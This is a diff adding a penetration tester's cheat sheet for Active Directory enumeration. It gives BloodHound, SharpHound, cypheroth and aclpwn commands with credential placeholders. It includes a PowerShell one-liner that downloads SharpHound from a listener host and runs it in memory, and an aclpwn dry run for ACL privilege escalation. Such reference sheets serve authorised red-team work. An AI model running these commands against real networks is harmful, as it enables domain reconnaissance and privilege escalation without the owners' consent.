@@ -1,0 +1,41 @@
+ % bloodhound, Active directory enumeration
+
+# start neo4j server
+https://neo4j.com/docs/ 
+neo4j start 
+
+# bloodhound start IHM
+https://github.com/BloodHoundAD/BloodHound 
+bloodhound 
+
+# bloodhound - collect data
+https://github.com/fox-it/BloodHound.py 
+bloodhound-python -d <domain> -u <user> -p <password> -c all 
+
+# bloodhound - collect data (alternative)
+https://github.com/fox-it/BloodHound.py 
+bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all 
+
+# sharphound - collect bloodhound data
+https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors powershell
+import-module sharphound.ps1
+invoke-bloodhound -collectionmethod all -domain <domain> 
+
+# sharphound - collect bloodhound data download and execute
+https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors powershell
+(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain> 
+
+# cypheroth - start
+Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.
+
+https://github.com/seajaysec/cypheroth 
+cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain> 
+
+# aclpwn - from computer to domain - dry run
+Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.
+
+https://github.com/fox-it/aclpwn.py 
+aclpwn -f <computer_name> -ft computer -d <domain> -dry 
+
+
+
